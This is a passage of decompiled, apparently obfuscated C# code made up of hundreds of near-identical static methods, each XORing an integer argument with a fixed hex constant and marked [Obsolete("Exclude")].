	[Obsolete("Exclude")]
	public static int smethod_2566(int int_4)
	{
		return int_4 ^ 0x57133E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2567(int int_4)
	{
		return int_4 ^ 0x290B4858;
	}

	[Obsolete("Exclude")]
	public static int smethod_2568(int int_4)
	{
		return int_4 ^ 0x6668AC2A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2569(int int_4)
	{
		return int_4 ^ 0x22F64FDB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2570(int int_4)
	{
		return int_4 ^ 0x414A36C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2571(int int_4)
	{
		return int_4 ^ 0x2580D18C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2572(int int_4)
	{
		return int_4 ^ 0x214BBFBD;
	}

	[Obsolete("Exclude")]
	public static int smethod_2573(int int_4)
	{
		return int_4 ^ 0x3213DDEF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2574(int int_4)
	{
		return int_4 ^ 0x10F36A83;
	}

	[Obsolete("Exclude")]
	public static int smethod_2575(int int_4)
	{
		return int_4 ^ 0x6EE8CFED;
	}

	[Obsolete("Exclude")]
	public static int smethod_2576(int int_4)
	{
		return int_4 ^ 0x6FF0BB33;
	}

	[Obsolete("Exclude")]
	public static int smethod_2577(int int_4)
	{
		return int_4 ^ 0x4F394AAA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2578(int int_4)
	{
		return int_4 ^ 0x576D26EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2579(int int_4)
	{
		return int_4 ^ 0x5B7FB0D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2580(int int_4)
	{
		return int_4 ^ 0x65902AE4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2581(int int_4)
	{
		return int_4 ^ 0x927373B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2582(int int_4)
	{
		return int_4 ^ 0x7BA885DA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2583(int int_4)
	{
		return int_4 ^ 0x2726F139;
	}

	[Obsolete("Exclude")]
	public static int smethod_2584(int int_4)
	{
		return int_4 ^ 0x59D88DF3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2585(int int_4)
	{
		return int_4 ^ 0x48C38D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2586(int int_4)
	{
		return int_4 ^ 0x1ACD1E25;
	}

	[Obsolete("Exclude")]
	public static int smethod_2587(int int_4)
	{
		return int_4 ^ 0x6372FEDF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2588(int int_4)
	{
		return int_4 ^ 0x8A94B75;
	}

	[Obsolete("Exclude")]
	public static int smethod_2589(int int_4)
	{
		return int_4 ^ 0x5A5D853D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2590(int int_4)
	{
		return int_4 ^ 0x685A3C2D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2591(int int_4)
	{
		return int_4 ^ 0x3E17D3CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2592(int int_4)
	{
		return int_4 ^ 0x3F434EB0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2593(int int_4)
	{
		return int_4 ^ 0x290CD2A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2594(int int_4)
	{
		return int_4 ^ 0x58EC0D1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2595(int int_4)
	{
		return int_4 ^ 0x408DBDA5;
	}

	[Obsolete("Exclude")]
	public static int smethod_2596(int int_4)
	{
		return int_4 ^ 0x5397E39C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2597(int int_4)
	{
		return int_4 ^ 0x219F0FF7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2598(int int_4)
	{
		return int_4 ^ 0x1FE06BC;
	}

	[Obsolete("Exclude")]
	public static int smethod_2599(int int_4)
	{
		return int_4 ^ 0x269DFD4C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2600(int int_4)
	{
		return int_4 ^ 0x4F306C22;
	}

	[Obsolete("Exclude")]
	public static int smethod_2601(int int_4)
	{
		return int_4 ^ 0x30FC3B99;
	}

	[Obsolete("Exclude")]
	public static int smethod_2602(int int_4)
	{
		return int_4 ^ 0x702BC711;
	}

	[Obsolete("Exclude")]
	public static int smethod_2603(int int_4)
	{
		return int_4 ^ 0x32F3308;
	}

	[Obsolete("Exclude")]
	public static int smethod_2604(int int_4)
	{
		return int_4 ^ 0x63757D36;
	}

	[Obsolete("Exclude")]
	public static int smethod_2605(int int_4)
	{
		return int_4 ^ 0x1BBA694E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2606(int int_4)
	{
		return int_4 ^ 0x72FC034E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2607(int int_4)
	{
		return int_4 ^ 0x43273E13;
	}

	[Obsolete("Exclude")]
	public static int smethod_2608(int int_4)
	{
		return int_4 ^ 0x4B92AE58;
	}

	[Obsolete("Exclude")]
	public static int smethod_2609(int int_4)
	{
		return int_4 ^ 0x5B5B5DBA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2610(int int_4)
	{
		return int_4 ^ 0x123F46C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_2611(int int_4)
	{
		return int_4 ^ 0x66CEAB51;
	}

	[Obsolete("Exclude")]
	public static int smethod_2612(int int_4)
	{
		return int_4 ^ 0x7A3716DE;
	}

	[Obsolete("Exclude")]
	public static int smethod_2613(int int_4)
	{
		return int_4 ^ 0x1F6937DE;
	}

	[Obsolete("Exclude")]
	public static int smethod_2614(int int_4)
	{
		return int_4 ^ 0x79ACB5ED;
	}

	[Obsolete("Exclude")]
	public static int smethod_2615(int int_4)
	{
		return int_4 ^ 0x528B8420;
	}

	[Obsolete("Exclude")]
	public static int smethod_2616(int int_4)
	{
		return int_4 ^ 0x41B9215C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2617(int int_4)
	{
		return int_4 ^ 0x3E433AD4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2618(int int_4)
	{
		return int_4 ^ 0x21E16DCA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2619(int int_4)
	{
		return int_4 ^ 0x987A799;
	}

	[Obsolete("Exclude")]
	public static int smethod_2620(int int_4)
	{
		return int_4 ^ 0x177857C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2621(int int_4)
	{
		return int_4 ^ 0x60799A04;
	}

	[Obsolete("Exclude")]
	public static int smethod_2622(int int_4)
	{
		return int_4 ^ 0x6371F838;
	}

	[Obsolete("Exclude")]
	public static int smethod_2623(int int_4)
	{
		return int_4 ^ 0x601024EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2624(int int_4)
	{
		return int_4 ^ 0x376342B0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2625(int int_4)
	{
		return int_4 ^ 0x19F92530;
	}

	[Obsolete("Exclude")]
	public static int smethod_2626(int int_4)
	{
		return int_4 ^ 0x2EE9C9D7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2627(int int_4)
	{
		return int_4 ^ 0x2A774372;
	}

	[Obsolete("Exclude")]
	public static int smethod_2628(int int_4)
	{
		return int_4 ^ 0x23825C5B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2629(int int_4)
	{
		return int_4 ^ 0x7AB41ADB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2630(int int_4)
	{
		return int_4 ^ 0x4B331A22;
	}

	[Obsolete("Exclude")]
	public static int smethod_2631(int int_4)
	{
		return int_4 ^ 0x7D39CE41;
	}

	[Obsolete("Exclude")]
	public static int smethod_2632(int int_4)
	{
		return int_4 ^ 0x33A82A60;
	}

	[Obsolete("Exclude")]
	public static int smethod_2633(int int_4)
	{
		return int_4 ^ 0x7A94B016;
	}

	[Obsolete("Exclude")]
	public static int smethod_2634(int int_4)
	{
		return int_4 ^ 0x539C071;
	}

	[Obsolete("Exclude")]
	public static int smethod_2635(int int_4)
	{
		return int_4 ^ 0x41AB78EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2636(int int_4)
	{
		return int_4 ^ 0x2280E944;
	}

	[Obsolete("Exclude")]
	public static int smethod_2637(int int_4)
	{
		return int_4 ^ 0x249B0730;
	}

	[Obsolete("Exclude")]
	public static int smethod_2638(int int_4)
	{
		return int_4 ^ 0x514EAE3F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2639(int int_4)
	{
		return int_4 ^ 0x74E79A56;
	}

	[Obsolete("Exclude")]
	public static int smethod_2640(int int_4)
	{
		return int_4 ^ 0x392C8B88;
	}

	[Obsolete("Exclude")]
	public static int smethod_2641(int int_4)
	{
		return int_4 ^ 0x42D7E4FC;
	}

	[Obsolete("Exclude")]
	public static int smethod_2642(int int_4)
	{
		return int_4 ^ 0x49E756C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2643(int int_4)
	{
		return int_4 ^ 0x6FC3DE59;
	}

	[Obsolete("Exclude")]
	public static int smethod_2644(int int_4)
	{
		return int_4 ^ 0x7D437C15;
	}

	[Obsolete("Exclude")]
	public static int smethod_2645(int int_4)
	{
		return int_4 ^ 0x66B2F3E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2646(int int_4)
	{
		return int_4 ^ 0x6E3C7F92;
	}

	[Obsolete("Exclude")]
	public static int smethod_2647(int int_4)
	{
		return int_4 ^ 0x1578B06C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2648(int int_4)
	{
		return int_4 ^ 0x452168F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2649(int int_4)
	{
		return int_4 ^ 0x36007277;
	}

	[Obsolete("Exclude")]
	public static int smethod_2650(int int_4)
	{
		return int_4 ^ 0x12FAC9C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2651(int int_4)
	{
		return int_4 ^ 0x5AA47806;
	}

	[Obsolete("Exclude")]
	public static int smethod_2652(int int_4)
	{
		return int_4 ^ 0x35124C1C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2653(int int_4)
	{
		return int_4 ^ 0x3D511C45;
	}

	[Obsolete("Exclude")]
	public static int smethod_2654(int int_4)
	{
		return int_4 ^ 0x69599FF3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2655(int int_4)
	{
		return int_4 ^ 0x730075DC;
	}

	[Obsolete("Exclude")]
	public static int smethod_2656(int int_4)
	{
		return int_4 ^ 0x1523479B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2657(int int_4)
	{
		return int_4 ^ 0x14F5DC65;
	}

	[Obsolete("Exclude")]
	public static int smethod_2658(int int_4)
	{
		return int_4 ^ 0x31ABB1F3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2659(int int_4)
	{
		return int_4 ^ 0x5934EBF4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2660(int int_4)
	{
		return int_4 ^ 0x4E0ACDEE;
	}

	[Obsolete("Exclude")]
	public static int smethod_2661(int int_4)
	{
		return int_4 ^ 0x164935DF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2662(int int_4)
	{
		return int_4 ^ 0x5E46A58B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2663(int int_4)
	{
		return int_4 ^ 0x69732C14;
	}

	[Obsolete("Exclude")]
	public static int smethod_2664(int int_4)
	{
		return int_4 ^ 0x8721F99;
	}

	[Obsolete("Exclude")]
	public static int smethod_2665(int int_4)
	{
		return int_4 ^ 0x31467C7E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2666(int int_4)
	{
		return int_4 ^ 0x30AAE7B5;
	}

	[Obsolete("Exclude")]
	public static int smethod_2667(int int_4)
	{
		return int_4 ^ 0x2249379D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2668(int int_4)
	{
		return int_4 ^ 0x240885BA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2669(int int_4)
	{
		return int_4 ^ 0xE781245;
	}

	[Obsolete("Exclude")]
	public static int smethod_2670(int int_4)
	{
		return int_4 ^ 0x74B76F76;
	}

	[Obsolete("Exclude")]
	public static int smethod_2671(int int_4)
	{
		return int_4 ^ 0x4A868B41;
	}

	[Obsolete("Exclude")]
	public static int smethod_2672(int int_4)
	{
		return int_4 ^ 0x701C228C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2673(int int_4)
	{
		return int_4 ^ 0xD34F79C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2674(int int_4)
	{
		return int_4 ^ 0x41B322F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2675(int int_4)
	{
		return int_4 ^ 0x77A6E220;
	}

	[Obsolete("Exclude")]
	public static int smethod_2676(int int_4)
	{
		return int_4 ^ 0x465949AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2677(int int_4)
	{
		return int_4 ^ 0x674EC496;
	}

	[Obsolete("Exclude")]
	public static int smethod_2678(int int_4)
	{
		return int_4 ^ 0x781A9E10;
	}

	[Obsolete("Exclude")]
	public static int smethod_2679(int int_4)
	{
		return int_4 ^ 0x64C5BA35;
	}

	[Obsolete("Exclude")]
	public static int smethod_2680(int int_4)
	{
		return int_4 ^ 0x682D7FA4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2681(int int_4)
	{
		return int_4 ^ 0x4E717F25;
	}

	[Obsolete("Exclude")]
	public static int smethod_2682(int int_4)
	{
		return int_4 ^ 0x76D72E9C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2683(int int_4)
	{
		return int_4 ^ 0x1E520C4A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2684(int int_4)
	{
		return int_4 ^ 0x19862C2B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2685(int int_4)
	{
		return int_4 ^ 0x31A0EFC6;
	}

	[Obsolete("Exclude")]
	public static int smethod_2686(int int_4)
	{
		return int_4 ^ 0x61BCA6F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2687(int int_4)
	{
		return int_4 ^ 0x7866D7E5;
	}

	[Obsolete("Exclude")]
	public static int smethod_2688(int int_4)
	{
		return int_4 ^ 0x7F994ABA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2689(int int_4)
	{
		return int_4 ^ 0x16D9F5C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2690(int int_4)
	{
		return int_4 ^ 0x4C060AEC;
	}

	[Obsolete("Exclude")]
	public static int smethod_2691(int int_4)
	{
		return int_4 ^ 0x792D3E50;
	}

	[Obsolete("Exclude")]
	public static int smethod_2692(int int_4)
	{
		return int_4 ^ 0x232CF3EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2693(int int_4)
	{
		return int_4 ^ 0x7AC1C3C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2694(int int_4)
	{
		return int_4 ^ 0x8237E02;
	}

	[Obsolete("Exclude")]
	public static int smethod_2695(int int_4)
	{
		return int_4 ^ 0x7E527091;
	}

	[Obsolete("Exclude")]
	public static int smethod_2696(int int_4)
	{
		return int_4 ^ 0xCF50A79;
	}

	[Obsolete("Exclude")]
	public static int smethod_2697(int int_4)
	{
		return int_4 ^ 0x41E5EA7F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2698(int int_4)
	{
		return int_4 ^ 0x3BF1BCF2;
	}

	[Obsolete("Exclude")]
	public static int smethod_2699(int int_4)
	{
		return int_4 ^ 0x38C38693;
	}

	[Obsolete("Exclude")]
	public static int smethod_2700(int int_4)
	{
		return int_4 ^ 0x3FE60748;
	}

	[Obsolete("Exclude")]
	public static int smethod_2701(int int_4)
	{
		return int_4 ^ 0x38847DCF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2702(int int_4)
	{
		return int_4 ^ 0x245CCED4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2703(int int_4)
	{
		return int_4 ^ 0x3EF791BE;
	}

	[Obsolete("Exclude")]
	public static int smethod_2704(int int_4)
	{
		return int_4 ^ 0x61BE937A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2705(int int_4)
	{
		return int_4 ^ 0x2D5FE060;
	}

	[Obsolete("Exclude")]
	public static int smethod_2706(int int_4)
	{
		return int_4 ^ 0x2DCF8924;
	}

	[Obsolete("Exclude")]
	public static int smethod_2707(int int_4)
	{
		return int_4 ^ 0x43B2DE70;
	}

	[Obsolete("Exclude")]
	public static int smethod_2708(int int_4)
	{
		return int_4 ^ 0x1B9B5E68;
	}

	[Obsolete("Exclude")]
	public static int smethod_2709(int int_4)
	{
		return int_4 ^ 0x464D2AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2710(int int_4)
	{
		return int_4 ^ 0x2E3064EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2711(int int_4)
	{
		return int_4 ^ 0x1D8E2C12;
	}

	[Obsolete("Exclude")]
	public static int smethod_2712(int int_4)
	{
		return int_4 ^ 0x8B0B6E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2713(int int_4)
	{
		return int_4 ^ 0x1FE036BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_2714(int int_4)
	{
		return int_4 ^ 0xF50FDD4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2715(int int_4)
	{
		return int_4 ^ 0x44DD2E8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2716(int int_4)
	{
		return int_4 ^ 0x36AB680D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2717(int int_4)
	{
		return int_4 ^ 0x42841F73;
	}

	[Obsolete("Exclude")]
	public static int smethod_2718(int int_4)
	{
		return int_4 ^ 0x72170CC3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2719(int int_4)
	{
		return int_4 ^ 0x3069A8A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_2720(int int_4)
	{
		return int_4 ^ 0x4EC937AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2721(int int_4)
	{
		return int_4 ^ 0x4D1ADE86;
	}

	[Obsolete("Exclude")]
	public static int smethod_2722(int int_4)
	{
		return int_4 ^ 0x4AAE1A2F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2723(int int_4)
	{
		return int_4 ^ 0x5FFF24B0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2724(int int_4)
	{
		return int_4 ^ 0x2EB4DE44;
	}

	[Obsolete("Exclude")]
	public static int smethod_2725(int int_4)
	{
		return int_4 ^ 0xC123917;
	}

	[Obsolete("Exclude")]
	public static int smethod_2726(int int_4)
	{
		return int_4 ^ 0x680EAB7D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2727(int int_4)
	{
		return int_4 ^ 0x1EDB3418;
	}

	[Obsolete("Exclude")]
	public static int smethod_2728(int int_4)
	{
		return int_4 ^ 0xCE60BFD;
	}

	[Obsolete("Exclude")]
	public static int smethod_2729(int int_4)
	{
		return int_4 ^ 0x1F57EC17;
	}

	[Obsolete("Exclude")]
	public static int smethod_2730(int int_4)
	{
		return int_4 ^ 0x67AFD7F8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2731(int int_4)
	{
		return int_4 ^ 0x1B06042E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2732(int int_4)
	{
		return int_4 ^ 0x7227197C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2733(int int_4)
	{
		return int_4 ^ 0x5B32C94F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2734(int int_4)
	{
		return int_4 ^ 0x3C95CC71;
	}

	[Obsolete("Exclude")]
	public static int smethod_2735(int int_4)
	{
		return int_4 ^ 0x4CBC194D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2736(int int_4)
	{
		return int_4 ^ 0x60E1C574;
	}

	[Obsolete("Exclude")]
	public static int smethod_2737(int int_4)
	{
		return int_4 ^ 0x40DCDC37;
	}

	[Obsolete("Exclude")]
	public static int smethod_2738(int int_4)
	{
		return int_4 ^ 0x7BD197E2;
	}

	[Obsolete("Exclude")]
	public static int smethod_2739(int int_4)
	{
		return int_4 ^ 0x601E1830;
	}

	[Obsolete("Exclude")]
	public static int smethod_2740(int int_4)
	{
		return int_4 ^ 0xF5C3F73;
	}

	[Obsolete("Exclude")]
	public static int smethod_2741(int int_4)
	{
		return int_4 ^ 0x3165ACA4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2742(int int_4)
	{
		return int_4 ^ 0x1FBCF3CD;
	}

	[Obsolete("Exclude")]
	public static int smethod_2743(int int_4)
	{
		return int_4 ^ 0x266131D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_2744(int int_4)
	{
		return int_4 ^ 0x2E50AA79;
	}

	[Obsolete("Exclude")]
	public static int smethod_2745(int int_4)
	{
		return int_4 ^ 0x2F9ED7EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_2746(int int_4)
	{
		return int_4 ^ 0x31DCA7DD;
	}

	[Obsolete("Exclude")]
	public static int smethod_2747(int int_4)
	{
		return int_4 ^ 0x4981A8D1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2748(int int_4)
	{
		return int_4 ^ 0x2F49B05;
	}

	[Obsolete("Exclude")]
	public static int smethod_2749(int int_4)
	{
		return int_4 ^ 0x16AC2E19;
	}

	[Obsolete("Exclude")]
	public static int smethod_2750(int int_4)
	{
		return int_4 ^ 0x5E29FD51;
	}

	[Obsolete("Exclude")]
	public static int smethod_2751(int int_4)
	{
		return int_4 ^ 0x5B5B04;
	}

	[Obsolete("Exclude")]
	public static int smethod_2752(int int_4)
	{
		return int_4 ^ 0x53977AAB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2753(int int_4)
	{
		return int_4 ^ 0x3A48ECD;
	}

	[Obsolete("Exclude")]
	public static int smethod_2754(int int_4)
	{
		return int_4 ^ 0x3796BE4F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2755(int int_4)
	{
		return int_4 ^ 0x72E8129A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2756(int int_4)
	{
		return int_4 ^ 0x2436F01F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2757(int int_4)
	{
		return int_4 ^ 0x28EF1F48;
	}

	[Obsolete("Exclude")]
	public static int smethod_2758(int int_4)
	{
		return int_4 ^ 0x50D660A9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2759(int int_4)
	{
		return int_4 ^ 0x4156B2D3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2760(int int_4)
	{
		return int_4 ^ 0x167B1CE9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2761(int int_4)
	{
		return int_4 ^ 0x6FF49D9E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2762(int int_4)
	{
		return int_4 ^ 0x1C13E1F8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2763(int int_4)
	{
		return int_4 ^ 0xD2A8121;
	}

	[Obsolete("Exclude")]
	public static int smethod_2764(int int_4)
	{
		return int_4 ^ 0xD1C6598;
	}

	[Obsolete("Exclude")]
	public static int smethod_2765(int int_4)
	{
		return int_4 ^ 0x5FC26D36;
	}

	[Obsolete("Exclude")]
	public static int smethod_2766(int int_4)
	{
		return int_4 ^ 0x11392C7B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2767(int int_4)
	{
		return int_4 ^ 0x37813F1E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2768(int int_4)
	{
		return int_4 ^ 0x61343624;
	}

	[Obsolete("Exclude")]
	public static int smethod_2769(int int_4)
	{
		return int_4 ^ 0x99EC41B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2770(int int_4)
	{
		return int_4 ^ 0x36C855E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2771(int int_4)
	{
		return int_4 ^ 0x379409CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2772(int int_4)
	{
		return int_4 ^ 0x20A2EDE1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2773(int int_4)
	{
		return int_4 ^ 0x5A358D3D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2774(int int_4)
	{
		return int_4 ^ 0x747ECE30;
	}

	[Obsolete("Exclude")]
	public static int smethod_2775(int int_4)
	{
		return int_4 ^ 0x7E63504;
	}

	[Obsolete("Exclude")]
	public static int smethod_2776(int int_4)
	{
		return int_4 ^ 0x7CB7E8DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2777(int int_4)
	{
		return int_4 ^ 0x676F3F20;
	}

	[Obsolete("Exclude")]
	public static int smethod_2778(int int_4)
	{
		return int_4 ^ 0x22A8A2EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2779(int int_4)
	{
		return int_4 ^ 0x11178FE6;
	}

	[Obsolete("Exclude")]
	public static int smethod_2780(int int_4)
	{
		return int_4 ^ 0x273152B9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2781(int int_4)
	{
		return int_4 ^ 0x4AF650E9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2782(int int_4)
	{
		return int_4 ^ 0x7EAE1DDF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2783(int int_4)
	{
		return int_4 ^ 0x7B3E1E51;
	}

	[Obsolete("Exclude")]
	public static int smethod_2784(int int_4)
	{
		return int_4 ^ 0x69F87006;
	}

	[Obsolete("Exclude")]
	public static int smethod_2785(int int_4)
	{
		return int_4 ^ 0x52E9204A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2786(int int_4)
	{
		return int_4 ^ 0x4E482A5A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2787(int int_4)
	{
		return int_4 ^ 0x6376EBC2;
	}

	[Obsolete("Exclude")]
	public static int smethod_2788(int int_4)
	{
		return int_4 ^ 0x55197906;
	}

	[Obsolete("Exclude")]
	public static int smethod_2789(int int_4)
	{
		return int_4 ^ 0x3C530CC8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2790(int int_4)
	{
		return int_4 ^ 0x2C30A41B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2791(int int_4)
	{
		return int_4 ^ 0x266402C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2792(int int_4)
	{
		return int_4 ^ 0x46B9EF1B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2793(int int_4)
	{
		return int_4 ^ 0x1CB273CA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2794(int int_4)
	{
		return int_4 ^ 0x6EBE04A0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2795(int int_4)
	{
		return int_4 ^ 0x3C53D82;
	}

	[Obsolete("Exclude")]
	public static int smethod_2796(int int_4)
	{
		return int_4 ^ 0x663D9F32;
	}

	[Obsolete("Exclude")]
	public static int smethod_2797(int int_4)
	{
		return int_4 ^ 0x4B909FEE;
	}

	[Obsolete("Exclude")]
	public static int smethod_2798(int int_4)
	{
		return int_4 ^ 0x10090816;
	}

	[Obsolete("Exclude")]
	public static int smethod_2799(int int_4)
	{
		return int_4 ^ 0x5E62741F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2800(int int_4)
	{
		return int_4 ^ 0x7FD0C871;
	}

	[Obsolete("Exclude")]
	public static int smethod_2801(int int_4)
	{
		return int_4 ^ 0x3372A069;
	}

	[Obsolete("Exclude")]
	public static int smethod_2802(int int_4)
	{
		return int_4 ^ 0x38C6C009;
	}

	[Obsolete("Exclude")]
	public static int smethod_2803(int int_4)
	{
		return int_4 ^ 0x5FDB0787;
	}

	[Obsolete("Exclude")]
	public static int smethod_2804(int int_4)
	{
		return int_4 ^ 0x31F82C84;
	}

	[Obsolete("Exclude")]
	public static int smethod_2805(int int_4)
	{
		return int_4 ^ 0x76A84D98;
	}

	[Obsolete("Exclude")]
	public static int smethod_2806(int int_4)
	{
		return int_4 ^ 0x5FE68B4D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2807(int int_4)
	{
		return int_4 ^ 0x6ABB27BF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2808(int int_4)
	{
		return int_4 ^ 0x7DD83186;
	}

	[Obsolete("Exclude")]
	public static int smethod_2809(int int_4)
	{
		return int_4 ^ 0x21B451BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_2810(int int_4)
	{
		return int_4 ^ 0x88E04E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2811(int int_4)
	{
		return int_4 ^ 0x3C2440C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2812(int int_4)
	{
		return int_4 ^ 0x699CB32B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2813(int int_4)
	{
		return int_4 ^ 0x1E12F6A9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2814(int int_4)
	{
		return int_4 ^ 0x6EBE9C9F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2815(int int_4)
	{
		return int_4 ^ 0x2DC922AC;
	}

	[Obsolete("Exclude")]
	public static int smethod_2816(int int_4)
	{
		return int_4 ^ 0x1778C175;
	}

	[Obsolete("Exclude")]
	public static int smethod_2817(int int_4)
	{
		return int_4 ^ 0x45524186;
	}

	[Obsolete("Exclude")]
	public static int smethod_2818(int int_4)
	{
		return int_4 ^ 0x4962C137;
	}

	[Obsolete("Exclude")]
	public static int smethod_2819(int int_4)
	{
		return int_4 ^ 0x1E70C133;
	}

	[Obsolete("Exclude")]
	public static int smethod_2820(int int_4)
	{
		return int_4 ^ 0x4CFEE58F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2821(int int_4)
	{
		return int_4 ^ 0x7D076690;
	}

	[Obsolete("Exclude")]
	public static int smethod_2822(int int_4)
	{
		return int_4 ^ 0x1B7EAC13;
	}

	[Obsolete("Exclude")]
	public static int smethod_2823(int int_4)
	{
		return int_4 ^ 0x3050B665;
	}

	[Obsolete("Exclude")]
	public static int smethod_2824(int int_4)
	{
		return int_4 ^ 0x351D54BC;
	}

	[Obsolete("Exclude")]
	public static int smethod_2825(int int_4)
	{
		return int_4 ^ 0x2DF09F2B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2826(int int_4)
	{
